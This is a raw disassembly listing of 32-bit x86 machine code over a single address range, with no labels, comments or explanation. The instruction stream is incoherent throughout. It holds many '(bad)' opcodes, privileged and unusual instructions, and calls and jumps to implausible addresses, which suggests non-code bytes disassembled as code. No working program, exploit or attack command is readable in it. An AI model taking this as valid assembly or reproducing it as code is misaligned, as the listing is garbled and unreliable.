  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
